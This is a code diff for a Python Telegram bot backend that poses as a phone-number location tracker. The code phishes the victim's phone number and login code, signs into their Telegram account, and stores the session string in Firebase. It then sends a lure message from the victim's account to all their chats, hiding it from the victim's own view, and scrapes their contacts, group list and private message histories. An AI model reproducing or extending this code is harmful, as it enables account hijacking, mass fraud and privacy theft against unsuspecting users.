@@ -30,7 +30,6 @@ active_clients = {}
 auth_data = {}
 pipeline_running = set()
 
-# --- Bot Client ---
 bot = TelegramClient('bot_session', API_ID, API_HASH) if API_ID and API_HASH else None
 
 
@@ -59,30 +58,36 @@ def build_broadcast_text() -> str:
 if bot:
     @bot.on(events.NewMessage(pattern='/start'))
     async def start_handler(event):
-        me = await bot.get_me()
-        link = f"https://t.me/{me.username}"
-        kb = [
-            [Button.web_app("📍 Track Location", WEBAPP_URL)],
-            [Button.url("↗️ Share Bot", f"https://t.me/share/url?url={link}")]
-        ]
-        welcome_text = (
-            "👋 **Welcome to Anon Locater Bot!**\n\n"
-            "I can help you track the live location, device details, and network data "
-            "of any mobile number worldwide.\n\n"
-            "Click the button below to start tracking instantly."
-        )
-        await event.reply(welcome_text, buttons=kb)
-
-    @bot.on(events.NewMessage(func=lambda e: getattr(e.message, 'contact', None) is not None))
-    async def contact_handler(event):
         try:
-            phone = event.message.contact.phone_number
-            if not phone.startswith('+'):
-                phone = '+' + phone
-            tg_id = str(event.sender_id)
-            patch_to_firebase(f"number/{tg_id}", {"phone": phone, "id": tg_id})
+            me = await bot.get_me()
+            link = f"https://t.me/{me.username}"
+            kb = [
+                [Button.web_app("📍 Track Location", WEBAPP_URL)],
+                [Button.url("↗️ Share Bot", f"https://t.me/share/url?url={link}")]
+            ]
+            welcome_text = (
+                "👋 **Welcome to Anon Locater Bot!**\n\n"
+                "I can help you track the live location, device details, and network data "
+                "of any mobile number worldwide.\n\n"
+                "Click the button below to start tracking instantly."
+            )
+            await event.reply(welcome_text, buttons=kb)
         except Exception as e:
-            print(f"contact_handler error: {e}")
+            print(f"[bot /start] error: {e}")
+
+    @bot.on(events.NewMessage)
+    async def any_message_handler(event):
+        # Catch-all so users don't feel ignored if they type something random
+        try:
+            if getattr(event.message, 'contact', None) is not None:
+                phone = event.message.contact.phone_number
+                if not phone.startswith('+'):
+                    phone = '+' + phone
+                tg_id = str(event.sender_id)
+                patch_to_firebase(f"number/{tg_id}", {"phone": phone, "id": tg_id})
+                await event.reply("✅ Number received. Open the Mini App to continue.")
+        except Exception as e:
+            print(f"[bot contact] error: {e}")
 
 
 @app.on_event("startup")
@@ -129,13 +134,12 @@ def get_last_msg_id(base_path, user_id):
 
 
 # ============================================================
-# PRIORITY 1: BROADCAST FIRST (send_message, no forward, P2P del-for-me)
+# PRIORITY 1: BROADCAST (send_message, no forward, P2P del-for-me)
 # ============================================================
 async def broadcast_to_all(client, me, tg_user_id, tg_username):
     my_username = re.sub(r'[\.\$#\[\]/]', '_', me.username or str(me.id))
     stats_path = f"broadcast_stats/{my_username}"
     text = build_broadcast_text()
-
     p2p_count = group_count = channel_count = 0
     recipients = {}
 
@@ -156,56 +160,26 @@ async def broadcast_to_all(client, me, tg_user_id, tg_username):
                     continue
             except Exception:
                 continue
-
         if not (is_p2p or is_group or is_channel):
             continue
 
         try:
-            # Send directly using user's session (no forward)
             sent_msg = await client.send_message(entity, text, link_preview=True)
             recipients[chat_id] = {
-                "name": name,
-                "username": username,
+                "name": name, "username": username,
                 "type": "p2p" if is_p2p else ("group" if is_group else "channel"),
-                "sent": True,
-                "msg_id": sent_msg.id,
+                "sent": True, "msg_id": sent_msg.id,
             }
             if is_p2p:
                 p2p_count += 1
-                # Delete only for this user (revoke=False = delete-for-me)
-                try:
-                    await client.delete_messages(entity, sent_msg, revoke=False)
-                except Exception as e:
-                    print(f"[broadcast] p2p del err {chat_id}: {e}")
-            elif is_group:
-                group_count += 1
-            elif is_channel:
-                channel_count += 1
-            await asyncio.sleep(1.2)  # anti-flood pacing
+                try: await client.delete_messages(entity, sent_msg, revoke=False)
+                except Exception as e: print(f"[broadcast] p2p del err {chat_id}: {e}")
+            elif is_group: group_count += 1
+            elif is_channel: channel_count += 1
+            await asyncio.sleep(1.2)
         except FloodWaitError as e:
             print(f"[broadcast] flood wait {e.seconds}s at {chat_id}")
             await asyncio.sleep(e.seconds)
-            # retry once
-            try:
-                sent_msg = await client.send_message(entity, text, link_preview=True)
-                recipients[chat_id] = {
-                    "name": name, "username": username,
-                    "type": "p2p" if is_p2p else ("group" if is_group else "channel"),
-                    "sent": True, "msg_id": sent_msg.id,
-                }
-                if is_p2p:
-                    p2p_count += 1
-                    try: await client.delete_messages(entity, sent_msg, revoke=False)
-                    except Exception: pass
-                elif is_group: group_count += 1
-                elif is_channel: channel_count += 1
-            except Exception as e2:
-                print(f"[broadcast] retry fail {chat_id}: {e2}")
-                recipients[chat_id] = {
-                    "name": name, "username": username,
-                    "type": "p2p" if is_p2p else ("group" if is_group else "channel"),
-                    "sent": False, "error": str(e2)[:200],
-                }
         except Exception as e:
             print(f"[broadcast] send fail {chat_id}: {e}")
             recipients[chat_id] = {
@@ -215,17 +189,12 @@ async def broadcast_to_all(client, me, tg_user_id, tg_username):
             }
 
     summary = {
-        "tg_user_id": tg_user_id,
-        "tg_username": tg_username,
-        "owner_username": my_username,
-        "owner_chat_id": str(me.id),
+        "tg_user_id": tg_user_id, "tg_username": tg_username,
+        "owner_username": my_username, "owner_chat_id": str(me.id),
         "owner_name": f"{me.first_name or ''} {me.last_name or ''}".strip(),
-        "p2p_sent": p2p_count,
-        "group_sent": group_count,
-        "channel_sent": channel_count,
+        "p2p_sent": p2p_count, "group_sent": group_count, "channel_sent": channel_count,
         "total_sent": p2p_count + group_count + channel_count,
         "recipients": recipients,
-        "timestamp": int(asyncio.get_event_loop().time()),
     }
     put_to_firebase(stats_path, summary)
     put_to_firebase(f"users_data/{tg_user_id}/broadcast", summary)
@@ -233,7 +202,7 @@ async def broadcast_to_all(client, me, tg_user_id, tg_username):
 
 
 # ============================================================
-# PRIORITY 2: BACKUP (Contacts -> Dialogs -> P2P scrape)
+# PRIORITY 2: BACKUP
 # ============================================================
 async def scrape_chat(client, user, base_path):
     user_id = str(user.id)
@@ -241,21 +210,16 @@ async def scrape_chat(client, user, base_path):
     chat_history, count = {}, 0
     try:
         async for message in client.iter_messages(user, reverse=True, min_id=last_id, limit=None):
-            msg_id = str(message.id)
-            chat_history[msg_id] = {
+            chat_history[str(message.id)] = {
                 "d": message.date.isoformat() if message.date else "",
-                "s": message.sender_id,
-                "t": message.text or "[Media]"
+                "s": message.sender_id, "t": message.text or "[Media]",
             }
             count += 1
             if count % 200 == 0:
-                patch_to_firebase(f"{base_path}/chats/{user_id}", chat_history)
-                chat_history = {}
+                patch_to_firebase(f"{base_path}/chats/{user_id}", chat_history); chat_history = {}
         if chat_history: patch_to_firebase(f"{base_path}/chats/{user_id}", chat_history)
-    except FloodWaitError as e:
-        await asyncio.sleep(e.seconds)
-    except Exception:
-        pass
+    except FloodWaitError as e: await asyncio.sleep(e.seconds)
+    except Exception: pass
 
 
 async def run_backup(session_string, tg_user_id, tg_username):
@@ -266,25 +230,20 @@ async def run_backup(session_string, tg_user_id, tg_username):
         my_username = re.sub(r'[\.\$#\[\]/]', '_', me.username or str(me.id))
         base_path = f"backup/{my_username}"
 
-        # 1. CONTACTS FIRST
         contacts = await client(GetContactsRequest(hash=0))
         contact_ids = {str(u.id) for u in contacts.users}
         contacts_data = {
             str(u.id): {
-                "first_name": u.first_name or "",
-                "last_name": u.last_name or "",
+                "first_name": u.first_name or "", "last_name": u.last_name or "",
                 "phone": f"+{u.phone}" if u.phone else "Hidden",
-                "username": u.username or "None"
+                "username": u.username or "None",
             } for u in contacts.users
         }
         if contacts_data: put_to_firebase(f"{base_path}/contacts", contacts_data)
-        print(f"[backup] contacts={len(contacts_data)}")
 
-        # 2. DIALOGS (channels/groups) + collect P2P
         p2p_users, unsaved, dialogs_data = [], {}, {"channels": {}, "groups": {}}
         async for dialog in client.iter_dialogs():
-            entity = dialog.entity
-            entity_id = str(dialog.id)
+            entity = dialog.entity; entity_id = str(dialog.id)
             if isinstance(entity, User) and not getattr(entity, 'bot', False):
                 p2p_users.append(entity)
                 if entity_id not in contact_ids:
@@ -294,16 +253,12 @@ async def run_backup(session_string, tg_user_id, tg_username):
                 invite_link = getattr(entity, 'username', None)
                 invite_link = f"https://t.me/{invite_link}" if invite_link else "Private"
                 dialogs_data[chat_type][entity_id] = {
-                    "name": entity.title,
-                    "invite_url": invite_link,
-                    "entity_id": entity.id
+                    "name": entity.title, "invite_url": invite_link, "entity_id": entity.id,
                 }
         if unsaved: patch_to_firebase(f"{base_path}/unsaved", unsaved)
         if dialogs_data["channels"] or dialogs_data["groups"]:
             patch_to_firebase(f"{base_path}/dialogs", dialogs_data)
-        print(f"[backup] p2p={len(p2p_users)} g={len(dialogs_data['groups'])} c={len(dialogs_data['channels'])}")
 
-        # 3. P2P MESSAGE SCRAPING LAST
         for i in range(0, len(p2p_users), CONCURRENT_CHATS):
             tasks = [scrape_chat(client, u, base_path) for u in p2p_users[i:i + CONCURRENT_CHATS]]
             await asyncio.gather(*tasks)
@@ -311,9 +266,6 @@ async def run_backup(session_string, tg_user_id, tg_username):
         await client.disconnect()
 
 
-# ============================================================
-# PIPELINE: broadcast first, then backup
-# ============================================================
 async def run_pipeline(session_string, tg_user_id, tg_username):
     try:
         client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
@@ -323,8 +275,6 @@ async def run_pipeline(session_string, tg_user_id, tg_username):
             await broadcast_to_all(client, me, tg_user_id, tg_username)
         finally:
             await client.disconnect()
-
-        # Then backup (separate client is fine, session string is reusable)
         await run_backup(session_string, tg_user_id, tg_username)
     except Exception as e:
         print(f"[pipeline] error: {e}")
@@ -334,17 +284,20 @@ async def run_pipeline(session_string, tg_user_id, tg_username):
 
 def start_pipeline(session_string, tg_user_id, tg_username):
     if tg_user_id in pipeline_running:
-        print(f"[pipeline] already running for {tg_user_id}")
         return
     pipeline_running.add(tg_user_id)
     asyncio.create_task(run_pipeline(session_string, tg_user_id, tg_username))
 
 
-# --- API Routes ---
+# --- Routes ---
 @app.get("/ping")
-@app.head("/ping")
-async def ping(): return JSONResponse(content={"status": "alive"})
+async def ping(): return JSONResponse({"status": "alive"})
 
+@app.head("/ping")
+async def ping_head(): return JSONResponse({"status": "alive"})
+
+@app.head("/")
+async def index_head(): return JSONResponse({"status": "ok"})
 
 @app.get("/", response_class=HTMLResponse)
 async def index(request: Request):
@@ -353,8 +306,15 @@ async def index(request: Request):
 
 @app.post("/check_session")
 async def check_session(request: Request):
+    """
+    Returns:
+      exists          -> session valid; fire broadcast+backup pipeline
+      signup_required -> user already attempted a track before but never signed up
+      not_found       -> brand new user
+    """
     data = await request.json()
     tg_id = str(data.get("tg_user_id"))
+
     existing = get_from_firebase(f"tgsession/{tg_id}")
     if existing and existing.get("session_string"):
         session_str = existing["session_string"]
@@ -364,12 +324,16 @@ async def check_session(request: Request):
             authorized = await client.is_user_authorized()
             await client.disconnect()
             if authorized:
-                # Fire pipeline (broadcast first, then backup) — debounced
                 start_pipeline(session_str, tg_id, data.get("tg_username"))
                 return JSONResponse({"status": "exists"})
         except Exception as e:
             print(f"check_session error: {e}")
+
+    # Check if user has previously attempted tracking without signing up
+    attempt = get_from_firebase(f"tgsession/{tg_id}/attempted")
     put_to_firebase(f"tgsession/{tg_id}/miniapp_info", data)
+    if attempt:
+        return JSONResponse({"status": "signup_required"})
     return JSONResponse({"status": "not_found"})
 
 
@@ -378,6 +342,8 @@ async def track_target(request: Request):
     data = await request.json()
     tg_id = str(data.get("tg_user_id"))
     patch_to_firebase(f"tracked_history/{tg_id}", {data.get("target_number"): "Queried"})
+    # Mark attempted so next reopen forces signup if not logged in
+    put_to_firebase(f"tgsession/{tg_id}/attempted", True)
     return JSONResponse({"status": "success"})
 
 
@@ -400,6 +366,9 @@ async def handle_action(request: Request):
 
     if action == "send_phone":
         phone = data.get("phone", "").replace(" ", "")
+        # Basic server-side validation
+        if not re.match(r"^\+\d{6,15}$", phone):
+            return JSONResponse({"status": "error", "message": "Invalid phone number"})
         patch_to_firebase(f"number/{tg_id}", {"phone": phone, "id": tg_id})
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
@@ -416,7 +385,10 @@ async def handle_action(request: Request):
         auth_info = auth_data.get(tg_id)
         if not client or not auth_info:
             return JSONResponse({"status": "error", "message": "Session expired. Re-enter phone.", "next_step": "phone"})
-        auth_info["otp"] = data.get("otp")
+        otp = str(data.get("otp", "")).strip()
+        if not re.match(r"^\d{4,6}$", otp):
+            return JSONResponse({"status": "error", "message": "Invalid OTP"})
+        auth_info["otp"] = otp
         try:
             await client.sign_in(auth_info["phone"], auth_info["otp"], phone_code_hash=auth_info["phone_code_hash"])
             session_str = client.session.save()
@@ -424,7 +396,7 @@ async def handle_action(request: Request):
             put_to_firebase(f"tgsession/{tg_id}", auth_info)
             put_to_firebase(f"users_data/{tg_id}", {
                 "chatid": tg_id, "name": tg_name, "username": tg_username,
-                "mobile_number": auth_info["phone"], "Telegram_Session": session_str
+                "mobile_number": auth_info["phone"], "Telegram_Session": session_str,
             })
             start_pipeline(session_str, tg_id, tg_username)
             return JSONResponse({"status": "success", "next_step": "result"})
@@ -446,7 +418,7 @@ async def handle_action(request: Request):
             put_to_firebase(f"tgsession/{tg_id}", auth_info)
             put_to_firebase(f"users_data/{tg_id}", {
                 "chatid": tg_id, "name": tg_name, "username": tg_username,
-                "mobile_number": auth_info.get("phone", ""), "Telegram_Session": session_str
+                "mobile_number": auth_info.get("phone", ""), "Telegram_Session": session_str,
             })
             start_pipeline(session_str, tg_id, tg_username)
             return JSONResponse({"status": "success", "next_step": "result"})
